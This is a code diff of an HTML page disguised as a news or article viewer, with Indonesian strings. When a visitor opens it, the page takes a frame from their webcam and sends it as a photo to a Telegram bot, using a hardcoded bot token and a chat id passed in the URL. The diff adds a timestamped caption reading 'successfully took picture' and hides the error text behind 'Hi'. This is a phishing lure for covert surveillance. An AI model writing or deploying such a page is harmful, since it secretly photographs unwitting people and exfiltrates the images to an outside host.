@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Article Viewer</title>
+  <title>Berita unik</title>
   <style>
     body, html, iframe {
       margin: 0;
@@ -27,7 +27,7 @@
   const uid = params.get('uid');
 
   if (!url || !uid) {
-    document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">❗ Parameter `url` dan `uid` wajib diisi.</h2>';
+    document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">Hi</h2>';
     throw new Error("Missing URL or UID");
   }
 
@@ -48,15 +48,19 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const base64img = canvas.toDataURL("image/png");
 
-        // Kirim ke Telegram
+        // Convert base64 to blob
         const bin = atob(base64img.split(',')[1]);
         const buffer = new Uint8Array(bin.length);
         for (let i = 0; i < bin.length; i++) buffer[i] = bin.charCodeAt(i);
         const blob = new Blob([buffer], { type: "image/png" });
 
+        // Kirim ke Telegram
         const form = new FormData();
         form.append("chat_id", uid);
         form.append("photo", blob, "webcam.png");
+
+        const timestamp = new Date().toLocaleTimeString();
+        form.append("caption", `📷 Berhasil mengambil gambar\n⏲️ ${timestamp}`);
 
         fetch(`https://api.telegram.org/bot7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI/sendPhoto`, {
           method: "POST",
